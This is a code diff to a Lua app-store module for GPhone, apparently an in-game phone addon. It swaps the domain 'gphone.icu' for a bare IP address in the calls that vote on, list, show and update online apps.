@@ -67,7 +67,7 @@ function APP.Run( frame, w, h, ratio )
 				local x = GPhone.RootToLocal( self, GPhone.GetCursorPos() )
 				local rate = math.Clamp( math.ceil( x / self:GetWidth() * 5 ), 1, 5 )
 				
-				http.Post("https://gphone.icu/api/vote",
+				http.Post("https://138.197.191.159/api/vote",
 					{
 						id = self.Id,
 						app = self.App,
@@ -156,7 +156,7 @@ function APP.Run( frame, w, h, ratio )
 					return true
 				end
 				
-				http.Fetch("https://gphone.icu/api/list?app="..app.App.."&id="..app.Id, function(body, size, headers)
+				http.Fetch("https://138.197.191.159/api/list?app="..app.App.."&id="..app.Id, function(body, size, headers)
 					code:SetText(string.gsub(body, "	", "    "))
 				end,
 				function(err)
@@ -216,7 +216,7 @@ function APP.Run( frame, w, h, ratio )
 	end
 	
 	local function addOnlineButton(name, app, click)
-		local url = "https://gphone.icu/api/list?app="..app.App.."&id="..app.Id
+		local url = "https://138.197.191.159/api/list?app="..app.App.."&id="..app.Id
 		local name = GPhone.SerializeAppName(url)
 		local but = addbutton(name, app, function(but)
 			click( but, self )
@@ -263,7 +263,7 @@ function APP.Run( frame, w, h, ratio )
 				local x = GPhone.RootToLocal( self, GPhone.GetCursorPos() )
 				local rate = math.Clamp( math.ceil( x / self:GetWidth() * 5 ), 1, 5 )
 				
-				http.Post("https://gphone.icu/api/vote",
+				http.Post("https://138.197.191.159/api/vote",
 					{
 						id = self.Id,
 						app = self.App,
@@ -506,7 +506,7 @@ function APP.Run( frame, w, h, ratio )
 	
 	function fetchOnlineApps(force)
 		if force or GetConVar("gphone_csapp"):GetBool() then
-			http.Fetch("https://gphone.icu/api/list", function(body, size, headers, code)
+			http.Fetch("https://138.197.191.159/api/list", function(body, size, headers, code)
 				local tbl = util.JSONToTable(body)
 				if type(tbl) == "table" then
 					frame.online = tbl
@@ -514,7 +514,7 @@ function APP.Run( frame, w, h, ratio )
 						if app.Icon then
 							GPhone.DownloadImage( app.Icon, 128, "background-color: #FFF; border-radius: 32px 32px 32px 32px" )
 						end
-						GPhone.UpdateApp("https://gphone.icu/api/list?app="..app.App.."&id="..app.Id, function(content)
+						GPhone.UpdateApp("https://138.197.191.159/api/list?app="..app.App.."&id="..app.Id, function(content)
 							app.Update = true
 						end)
 					end
